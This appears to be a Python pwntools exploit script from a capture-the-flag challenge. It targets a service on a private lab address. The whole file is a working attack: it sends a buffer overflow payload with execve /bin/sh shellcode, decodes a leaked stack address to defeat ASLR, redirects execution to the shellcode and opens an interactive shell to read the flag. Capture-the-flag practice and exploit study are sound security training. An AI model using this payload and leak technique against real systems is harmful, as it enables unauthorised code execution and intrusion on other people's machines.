from pwn import *
import struct
def main():

	#Constants
	HOST = "192.168.56.102"
	PORT = 53334
	#exit_addr = struct.pack("<I",0x80486b8) #Used in debugging
	caller_addr = struct.pack("<I",0x8048810)
	shellcode = "\xeb\x0a\x5b\x31\xd2\x31\xc9\x6a\x0b\x58\xcd\x80\xe8\xf1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"

	#Size
	s = "300"

	#payload with checks in place
	p_1 = "A@\x83\xc7EFGHIJKLMNOPAAAABBBBCCCC\xff\x00\x00\x00EEEEFFFFGGGGHHHH"+caller_addr+shellcode

	#Start Session
	r = remote(HOST,PORT)
	print r.recvuntil("Size: ")

	#Wait, this is for debugger
	raw_input("$")

	#Begin sending data
	r.sendline(s)
	r.sendline(p_1+"A"*(int(s)-len(p_1)))

	#ASLR Leak
	data =  r.recv()
	stack_value = 0
	stack_leak = []

	#Get the stack leak out of the data
	for index,c in enumerate(data):
		if index >= 109 and index < 113:
			#Decode the leak 
			stack_leak.append((ord(c)^0x158)&0xff)

	#Voodoo wizardy of flipping bytes
	stack_leak = map(hex,stack_leak[::-1])
	stack_leak = "".join(map(lambda x: x.lstrip("0x"),stack_leak))
	stack_leak = (int(stack_leak,16))
	print hex(stack_leak-76)

	#Finished stack leak
	stack_loc = struct.pack("<I",stack_leak-76)

	#Redo the original checks but send ourselves to the shellcode
	p_2 = "A@\x83\xc7EFGHIJKLMNOPAAAABBBBCCCC\xff\x00\x00\x00EEEEFFFFGGGGHHHH"+stack_loc
	raw_input("$")
	r.sendline(s)
	r.sendline(p_2+"A"*(int(s)-len(p_2)))

	#Start interacting and get flag	
	r.interactive()	
main()
